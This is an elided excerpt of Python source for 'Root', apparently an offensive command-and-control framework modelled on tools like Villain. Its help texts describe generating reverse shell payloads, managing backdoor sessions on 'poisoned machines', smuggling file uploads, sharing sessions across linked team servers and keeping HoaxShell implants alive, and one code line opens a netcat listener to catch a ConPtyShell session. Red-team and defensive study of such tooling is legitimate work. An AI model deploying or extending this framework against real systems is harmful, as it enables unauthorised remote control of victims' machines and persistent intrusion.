...
#
# This script is part of the Root framework: 
# https://github.com/HrYuviJoon/Root
...
parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Root client (sibling server) to connect to your instance without prompting you for verification.")
...
def print_meta():
	print(f'{META} Created by HrYuviJoon')
	print(f'{META} Follow on Twitter, HTB, GitHub: @HrYuviJoon')
...
class PrompHelp:
	...
	commands = {
		...
		'connect' : {
			'details' : f''' 			
Connect with another instance of Root (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a Root instance can have (adjustable). In case you forgot the team server port number (default: 6501), use "sockets" to list Root related services info. Read the Usage Guide or check my YouTube channel (@HaxorTechTones) for details.
...
connect <IP> <TEAM_SERVER_PORT>''',
		...
		'generate' : {
			'details' : f''' 		
Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in Root/Core/payload_templates and edit or create your own.
...
- To catch HoaxShell https-based reverse shells you need to start Root with SSL.
...
*Command(s) should be quoted.''',
		...
		'repair' : {
			'details' : f''' 			
Use this command to manually correct a backdoor session's hostname/username value, in case Root does not interpret the information correctly when the session is established.
...
Siblings are basically other instances of Root that you are connected with.''',
			'least_args' : 0,
			'max_args' : 0
		},
		...
		'threads' : {
			'details' : f'''
Root creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file Root/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by Root, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
...
Note that, if the thread limiter reaches 0, weird things will start happening as new threads (e.g. backdoor sessions) will be queued until: thread limiter > 0.''',
		...
		'sockets' : {
			'details' : f'''Prints Root related socket services info.''',
			'least_args' : 0,
			'max_args' : 0
		},
		...
		'upload' : {
			'details' : f'''
Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Root's main prompt as well as the pseudo shell terminal.
...
upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>''',
		...
		'cmdinspector' : {
			'details' : f'''
Root has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
...
conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
		...
		'flee' : {
			'details' : f'''Quit without terminating active sessions. When you start Root again, if any HoaxShell implant is still running on previously injected hosts, the session(s) will be re-established.''',
			'least_args' : 0,
			'max_args' : 0
		},
	...
	def print_main_help_msg():
		...
		\r  sockets              Print Root related running services' info.
...
def main():
	...
	if not args.skip_update:
		...
		try:
			...
			branch = 'main' 
			url = f'https://api.github.com/repos/HrYuviJoon/Root/git/trees/{branch}?recursive=1'
			raw_url = f'https://raw.githubusercontent.com/HrYuviJoon/Root/{branch}/'		
			Loading.active = True
				...
				for filename in files:
					...
					if not local_signature or (local_signature != latest_signature):
						...
						if update_consent:
							...
							if not updated:
								Loading.stop()
								print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Root.')
								exit(1)
			...
			if Main_prompt.ready:
				...
				if cmd == 'help':					
					...
					if sessions_check[0]:
						...
						# Construct Root issued command to request and exec ConPtyShell
						...
						if session_owner_id == core.return_server_uniq_id():
							...
							if verified.lower().strip() in ['y', 'yes']:
								# Start listener
								os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
								Root_cmd['issuer'] = core.return_server_uniq_id()
								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, Root_cmd)
